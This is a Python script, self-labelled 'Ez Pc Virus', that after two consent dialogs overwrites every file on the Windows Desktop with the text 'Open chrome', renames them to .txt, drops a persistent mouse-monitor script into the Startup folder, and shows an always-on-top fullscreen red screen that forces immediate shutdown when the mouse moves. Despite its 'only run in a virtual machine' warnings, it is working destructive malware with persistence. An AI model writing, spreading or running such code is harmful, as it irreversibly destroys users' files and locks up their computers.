import tkinter as tk
from tkinter import messagebox
import os
import ctypes
from ctypes import wintypes
import subprocess
import threading
import time

# ==============================================
# CEK APAKAH DESKTOP ADA DI ONEDRIVE
# ==============================================
def is_desktop_in_onedrive():
    # Ambil jalur Desktop resmi
    buf = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
    ctypes.windll.shell32.SHGetFolderPathW(None, 0, None, 0, buf)
    desktop_path = buf.value

    # Cek jalur OneDrive umum
    onedrive_path = os.environ.get("OneDrive", "")
    onedrive_path_corp = os.environ.get("OneDriveCommercial", "")

    if onedrive_path and desktop_path.lower().startswith(onedrive_path.lower()):
        return True, desktop_path, "OneDrive Personal"
    if onedrive_path_corp and desktop_path.lower().startswith(onedrive_path_corp.lower()):
        return True, desktop_path, "OneDrive Commercial"
    
    # Cek pola lain
    if "onedrive" in desktop_path.lower():
        return True, desktop_path, "OneDrive (Custom)"
    
    return False, desktop_path, "Local Disk"

# ==============================================
# STEP 1: FIRST WARNING
# ==============================================
def show_first_warning():
    in_onedrive, lokasi, jenis = is_desktop_in_onedrive()
    
    info_lokasi = f"Desktop location: {jenis}"
    if in_onedrive:
        info_lokasi += "\n\nWARNING: Your Desktop is inside OneDrive!\nFiles modified here will sync to cloud."

    root = tk.Tk()
    root.withdraw()
    res = messagebox.askyesno(
        "FIRST WARNING",
        f"This program will modify files on your Desktop.\n"
        f"All files will be overwritten and renamed.\n"
        f"This action cannot be undone easily.\n\n"
        f"{info_lokasi}\n\n"
        f"ONLY RUN IN VIRTUAL MACHINE\n"
        f"DO NOT RUN ON YOUR REAL COMPUTER\n\n"
        f"Are you sure you want to continue?"
    )
    root.destroy()
    return res

# ==============================================
# STEP 2: SECOND WARNING
# ==============================================
def show_second_warning():
    root = tk.Tk()
    root.withdraw()
    res = messagebox.askyesno(
        "FINAL CONFIRMATION",
        "A file will be created in Startup folder.\n"
        "Mouse movement will be monitored.\n"
        "If mouse moves when told to STOP, PC will shutdown.\n\n"
        "Click YES to proceed. Click NO to exit."
    )
    root.destroy()
    return res

# ==============================================
# GET DESKTOP PATH
# ==============================================
def get_desktop_path():
    _, path, _ = is_desktop_in_onedrive()
    return path

# ==============================================
# GET STARTUP FOLDER
# ==============================================
def get_startup_path():
    return os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")

# ==============================================
# CREATE MONITOR FILE IN STARTUP
# ==============================================
def create_startup_file():
    startup_dir = get_startup_path()
    monitor_file = os.path.join(startup_dir, "mouse_monitor.pyw")
    
    isi = '''import tkinter as tk
import ctypes
from ctypes import wintypes
import subprocess
import time
import threading

def get_mouse_pos():
    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
    pt = POINT()
    ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
    return pt.x, pt.y

def monitor(label, root):
    while True:
        time.sleep(120)
        label.config(text="STOP\\n\\nDo NOT move your mouse!")
        root.update()
        
        x1, y1 = get_mouse_pos()
        time.sleep(3)
        x2, y2 = get_mouse_pos()
        
        if abs(x1 - x2) > 5 or abs(y1 - y2) > 5:
            label.config(text="MOVED!\\n\\nShutting down...")
            root.update()
            time.sleep(1)
            subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
            return
        
        label.config(text="Ez Pc Virus")

root = tk.Tk()
root.title("")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="#cc0000")

label = tk.Label(
    root,
    text="Ez Pc Virus",
    font=("Arial", 60, "bold"),
    bg="#cc0000",
    fg="white",
    justify="center"
)
label.pack(expand=True)

def keep_on_top():
    root.lift()
    root.attributes("-topmost", True)
    root.after(500, keep_on_top)
keep_on_top()

threading.Thread(target=monitor, args=(label, root), daemon=True).start()
root.mainloop()
'''
    
    try:
        with open(monitor_file, "w", encoding="utf-8") as f:
            f.write(isi)
    except Exception:
        pass

# ==============================================
# MAIN PROCESS
# ==============================================
def main():
    if not show_first_warning():
        return
    if not show_second_warning():
        return

    desktop = get_desktop_path()
    script_path = os.path.abspath(__file__)

    # Buat file baru di Startup
    create_startup_file()

    # Ubah semua file di Desktop
    changed_count = 0
    for dir_path, _, files in os.walk(desktop):
        for filename in files:
            full_path = os.path.join(dir_path, filename)
            if full_path == script_path:
                continue
            try:
                with open(full_path, "w", encoding="utf-8", errors="ignore") as f:
                    f.write("Open chrome\n")
                base_name = os.path.splitext(filename)[0]
                new_path = os.path.join(dir_path, f"{base_name}.txt")
                counter = 1
                while os.path.exists(new_path):
                    new_path = os.path.join(dir_path, f"{base_name}({counter}).txt")
                    counter += 1
                os.rename(full_path, new_path)
                changed_count += 1
            except Exception:
                pass

    # Layar merah — selalu di atas
    root = tk.Tk()
    root.title("")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="#cc0000")

    label = tk.Label(
        root,
        text="Ez Pc Virus",
        font=("Arial", 60, "bold"),
        bg="#cc0000",
        fg="white",
        justify="center"
    )
    label.pack(expand=True)

    # Selalu di atas
    def keep_on_top():
        root.lift()
        root.attributes("-topmost", True)
        root.after(500, keep_on_top)
    keep_on_top()

    # Pantau mouse
    def get_mouse_pos():
        class POINT(ctypes.Structure):
            _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
        pt = POINT()
        ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
        return pt.x, pt.y

    def monitor_mouse():
        while True:
            time.sleep(120)
            label.config(text="STOP\n\nDo NOT move your mouse!")
            root.update()
            
            x1, y1 = get_mouse_pos()
            time.sleep(3)
            x2, y2 = get_mouse_pos()
            
            if abs(x1 - x2) > 5 or abs(y1 - y2) > 5:
                label.config(text="MOVED!\n\nShutting down...")
                root.update()
                time.sleep(1)
                subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
                return
            
            label.config(text="Ez Pc Virus")

    threading.Thread(target=monitor_mouse, daemon=True).start()
    root.mainloop()

# ==============================================
# RUN
# ==============================================
if __name__ == "__main__":
    main()